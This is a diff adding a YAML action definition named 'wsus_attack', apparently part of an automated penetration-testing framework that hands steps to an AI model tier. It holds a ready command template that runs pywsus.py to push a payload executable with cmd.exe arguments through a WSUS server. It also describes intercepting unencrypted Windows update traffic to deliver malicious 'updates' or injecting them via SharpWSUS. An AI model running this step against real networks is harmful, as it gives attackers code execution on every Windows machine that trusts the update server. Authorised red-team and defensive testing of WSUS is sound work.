@@ -1,0 +1,16 @@
+name: wsus_attack
+category: ad
+description: WSUS exploitation for code execution
+preconditions:
+  - os==windows
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "python3 pywsus.py --host {wsus_ip} --port 8530 --executable /path/to/payload.exe --payload-args '/c cmd.exe'"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "If WSUS uses HTTP (not HTTPS), MITM update traffic to push malicious 'updates'. SharpWSUS for injection from compromised WSUS server directly."
